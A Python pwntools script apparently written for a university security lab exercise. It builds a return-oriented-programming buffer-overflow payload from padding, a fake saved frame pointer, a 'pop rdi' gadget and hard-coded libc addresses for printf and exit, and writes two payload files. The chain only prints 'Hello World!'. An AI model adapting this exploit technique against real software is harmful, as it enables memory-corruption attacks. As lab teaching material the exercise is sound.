#!/usr/bin/env python3
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016
#
# 	Gede Ria Ghosalya
# 	1001841

from pwn import *

# After doing a pattern search with payload of length 150,
# by using `patter offset` command with the content of RBP as argument
# it is found that the lenfill needed is 64
hello_string = b"Hello World!\0"
lenfill = 64 - len(hello_string) 
# this makes sure the string address will be (RBP-0x0c) 
# 0x0c == 13 being the string length

# Set up return address. pwnlib is used to turn int to string
storedRBP = p64(0x4444444444444444) # DDDDDDDD in hex

# based on how GDB has its RBP at 0x7fffffffd740,
# string should be on 0x00007fffffffd733
string_gdb = p64(0x00007fffffffd733)


# some of found `pop rdi` search results:
# 0x00007ffff7acd018 : (b'5fc3')	pop rdi; ret
# 0x00007ffff7a3501b : (b'5fc3')	pop rdi; ret
# 0x00007ffff7b08023 : (b'5fc3')	pop rdi; ret
# 0x00007ffff7a81825 : (b'5fc3')	pop rdi; ret
# 0x00007ffff7af1828 : (b'5fc3')	pop rdi; ret
gadget_gdb = p64(0x00007ffff7b08023)

# > gdb-peda$ p printf
# $1 = {<text variable, no debug info>} 0x7ffff7a62800 <__printf>
printf_gdb = p64(0x00007ffff7a62800)
# gdb-peda$ p exit
# $2 = {<text variable, no debug info>} 0x7ffff7a47030 <__GI_exit>
exit_gdb   = p64(0x00007ffff7a47030)

# adapting to shell's RBP (0x7fffffffd90), 
# string address should be 0x7fffffffd83
string_sh = p64(0x00007fffffffd783)

# the rest should be the same since libc
# should be in same memory
gadget_sh = p64(0x00007ffff7b08023)
printf_sh = p64(0x00007ffff7a62800)
exit_sh = p64(0x00007ffff7a47030)


# With this, we were able to run the shellcode in normal shell.

with open('payROPgdb','wb') as f:
    f.write(b'A' * lenfill + hello_string + storedRBP
    			 + gadget_gdb + string_gdb
    			 + printf_gdb + exit_gdb + b'\n')

with open('payROP','wb') as f:
    f.write(b'A' * lenfill + hello_string  + storedRBP
    			 + gadget_sh + string_sh
    			 + printf_sh + exit_sh + b'\n')
